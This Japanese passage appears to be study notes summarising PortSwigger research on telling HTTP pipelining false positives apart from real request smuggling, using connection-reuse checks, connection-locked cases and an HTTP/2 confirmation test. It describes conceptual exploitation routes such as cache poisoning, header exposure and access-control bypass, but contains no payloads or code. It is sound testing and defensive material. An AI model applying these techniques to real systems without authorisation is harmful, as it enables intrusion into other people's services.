> 出典: How to distinguish HTTP pipelining from request smuggling — https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling

#### どのツール設定が誤検知を生みやすいか

「コネクション再利用が有効なとき**だけ**動く」状況は、次のようなツール設定で発生します。これらを使っているときに出た PoC は、まず誤検知を疑うべきです。

- **Turbo Intruder** で `requestsPerConnection > 1`（1コネクションあたり複数リクエスト）に設定している。
- **Burp Intruder** で「HTTP/1 Connection Reuse」を有効にしている。
- **Burp Repeater** で「Send group in sequence (single connection)」（グループを1本のコネクションで順に送る）を使っている。

いずれも「1本のソケットに複数リクエストを流す」設定です。つまり pipelining が起きる条件そのものであり、クライアント↔サーバの局所的な連結が「スマグリング」に見えてしまうわけです。

### 切り分けの実務——ステップ

#### ステップ1：まずコネクション再利用を切ってみる

最初の切り分けは単純です。**コネクション再利用を無効にして（＝毎回新しいコネクションで1リクエストだけ送って）、同じ PoC が再現するかを見る**。

- 再利用を切ると**再現しない**なら → クライアント↔サーバの局所現象、すなわち **pipelining の誤検知**である可能性が高い。
- 再利用を切っても**依然として他リクエストへ影響が出る**なら → フロントエンド↔バックエンドの本物の desync である可能性が高い。

ただし注意すべき例外があります。次に述べる「connection-locked（コネクションロック型）」の本物の脆弱性は、**再利用を切ると再現しない**にもかかわらず、本物です。したがって「再利用時だけ動く＝必ず誤検知」と断定はできません。だからこそ、後述の HTTP/2 による確定テストが要ります。

#### ステップ2：connection-locked request smuggling を知る

「connection-locked request smuggling」とは、記事の定義によれば、

> 「一部のフロントエンドサーバは、**クライアント側のコネクションが再利用された場合にのみ、上流（バックエンドへの）コネクションを再利用する**。」

という挙動に起因する、**本物の**脆弱性クラスです。

原理はこうです。通常のスマグリングは「バックエンドへ送られる余り（prefix）が、次の（別ユーザの）リクエストにくっつく」ことで成立します。ところがフロントエンドが「クライアントがコネクションを再利用したときだけ、上流コネクションを再利用（＝プールから使い回し）する」実装になっていると、**あなたがクライアント側でコネクションを再利用したときにしか、バックエンド側の desync が発火しない**のです。

このため、connection-locked 型は「コネクション再利用時だけ動く」という、一見誤検知とそっくりの症状を示します。しかし中身は本物のフロント↔バック desync です。だから症状だけでは白黒つかず、確定テストが必要になります。

#### ステップ3：HTTP/2 で「確定」させる（ダブルチェック）

pipelining の誤検知と、connection-locked を含む本物のスマグリングを**確実に**切り分ける決め手が、**HTTP/2 を使った確認テスト**です。記事はこう述べます。

> 「HTTP/2 で1つのリクエストを送り、その応答の中に**別の HTTP/1 レスポンスが入れ子（nested）**になって返ってくるかを確かめる。もしそうなれば、これは false positive ではないと証明できる。」

なぜこれで確定するのか——ここが原理の核心です。

- **HTTP/2 には HTTP/1 の「コネクション連結」という概念がない**。HTTP/2 は1本の TCP コネクション上で複数のストリームを多重化する仕組みで、リクエストはバイナリフレームに分割され、`Content-Length` による「バイト列の連結」でリクエスト境界を切るという HTTP/1 流のやり方をしません。
- したがって、HTTP/2 のリクエスト内には「pipelining によって連結された2つ目のリクエスト」を仕込む余地が、HTTP/1 の意味では**存在しない**。クライアント↔サーバの局所的な連結誤認（＝誤検知の原因）は起こりようがない。
- それにもかかわらず、**HTTP/2 のリクエストを1本送っただけで、応答の中に「本来バックエンドが返した、埋め込まれた HTTP/1 のレスポンス」が現れる**なら、それはフロントエンドが HTTP/2 を HTTP/1 に翻訳（downgrade）する過程で desync が起き、バックエンドが2つのリクエストとして解釈した証拠になります。これは pipelining では絶対に説明できない、**本物のフロント↔バック desync**の直接証拠です。

言い換えると、HTTP/2 テストは「pipelining という誤検知の逃げ道を物理的に塞いだうえで、それでもなお余りが混入するか」を見るテストです。塞いでもなお混入するなら、原因は pipelining ではなく、サーバ間の同期ずれしかあり得ません。

> 出典: How to distinguish HTTP pipelining from request smuggling — https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling

#### ステップ3の補足：HTTP/2 が使えないときの考え方

対象がフロントエンドで HTTP/2 を受け付けない場合、この確定テストは使えません。その場合は、pipelining の誤検知でないことを別の観測可能な「本物の被害」で裏づける必要があります。たとえば、

- **他ユーザ／他コネクションへの影響が観測できるか**（自分の1本のコネクションに閉じていないか）。
- **キャッシュ汚染（web cache poisoning）が成立するか**——後述のように、共有キャッシュへ毒が入るなら、それは自分のコネクションの外に影響が出ている証拠。

これらはいずれも「クライアント↔サーバの局所現象では説明できない」観測であり、本物性の傍証になります。

### Burp の「Smuggling or pipelining?」カスタムアクション

PortSwigger は、この切り分けを自動化する **Custom Action（カスタムアクション）「Smuggling or pipelining?」** を公開しました。Burp Repeater に組み込んで使えます。

このアクションは、上で説明した切り分けロジック——コネクション再利用の有無での挙動差の観察、そして HTTP/2 による確定テスト——を機械的に実行し、「今見えているのは pipelining（誤検知）なのか、それとも本物の smuggling なのか」を判定する手助けをします。手動での試行錯誤を減らし、報告前のセルフチェックとして有用です。

> 出典: How to distinguish HTTP pipelining from request smuggling — https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling

### connection state 攻撃との区別

記事はもう一つ、混同しやすい概念として「**connection state 攻撃（コネクション状態攻撃）**」に触れています。これは、

> 「サーバが、**各コネクションの最初のリクエスト**を、後続のリクエストとは違う扱いにする」

ことを悪用する攻撃です。たとえば「同一コネクションの2本目以降は、1本目で提示した TLS クライアント証明書や Host を再検証しない（first-request routing / first-request validation）」といった実装差を突きます。

これは境界の desync（スマグリング）とは**別のメカニズム**ですが、被害の性質（アクセス制御バイパスなど）は似通うことがあります。pipelining の誤検知を切り分ける際、「これは境界ずれなのか、それとも first-request の扱い差なのか」も意識しておくと、現象の正しい分類ができます。

> 出典: How to distinguish HTTP pipelining from request smuggling — https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling

### 本物だった場合の悪用経路（＝報告時に示すべき実害）

誤検知でないと確定できたとき、とくに connection-locked のような「コネクション再利用時にだけ動く」本物のケースでも、記事は現実的な悪用経路（＝防御側が重視すべき実害）を挙げています。報告では、単に「余りが混入した」ではなく、次のような**再現可能な実害**まで示すことが、誤検知との差を明確にします。

1. **web cache poisoning（キャッシュ汚染）** が可能なら、それを使って影響を他者へ拡大できる。共有キャッシュに毒が入る＝自分のコネクションの外に被害が出る＝本物である何よりの証拠。
2. **入力のリフレクション（reflection）** を利用して、**フロントエンドが注入しているヘッダ**（内部ルーティング用ヘッダ、認証済みを示すヘッダ等）を暴露させる。
3. **セキュリティ制御のバイパス**（ブロックされているパスへの到達、認証の回避など）。
4. **Host ヘッダ改ざん**系の攻撃（内部ホストへのルーティングなど）。

これらは「クライアント↔サーバの局所現象」では原理的に到達できない結果です。逆に言えば、これらのどれも示せず「コネクション再利用時に2つ目のレスポンスが返る」だけなら、それは pipelining の誤検知である可能性が高い、という判断につながります。

> 出典: How to distinguish HTTP pipelining from request smuggling — https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling

### まとめ：切り分けの判断フロー

現象を見たときの思考手順を整理します。

1. **その PoC はコネクション再利用（Turbo Intruder の `requestsPerConnection>1`、Intruder の Connection Reuse、Repeater の single connection 送信など）を有効にしたときだけ動いているか？**
   - はい → まず誤検知（pipelining）を疑う。ただし connection-locked の本物の可能性も残る。
   - いいえ（新規コネクション1本でも他リクエストに影響が出る） → 本物の可能性が高い。
2. **HTTP/2 が使えるか？**
   - 使える → **HTTP/2 リクエスト1本の応答に、入れ子の HTTP/1 レスポンスが現れるか**を確認。現れれば本物確定（pipelining では説明不可）。現れなければ、その症状は pipelining の誤検知だった可能性が高い。
   - 使えない → キャッシュ汚染や他ユーザへの影響など、**自分のコネクションの外に出る実害**で本物性を裏づける。
3. **Burp の「Smuggling or pipelining?」カスタムアクション**を使って、上記の判定を自動化・再確認する。
4. 迷ったら、「この現象は**他人に影響するか**」を自問する。影響するなら smuggling、自分の1本のソケットに閉じるなら pipelining。

この節の要点は、**「コネクション再利用時にだけ再現する症状」は、それ単体では本物の証拠にならない**ということです。HTTP/2 による確定テスト、あるいは共有キャッシュ・他ユーザへの実害という「局所現象では説明できない観測」まで到達して初めて、本物の request smuggling だと言えます。防御側にとっても、この切り分けができれば、誤検知に振り回されず「本当に修正すべきフロント↔バック間の同期ずれ」に資源を集中できます。

> 出典: How to distinguish HTTP pipelining from request smuggling（James Kettle, PortSwigger, 2025）— https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling
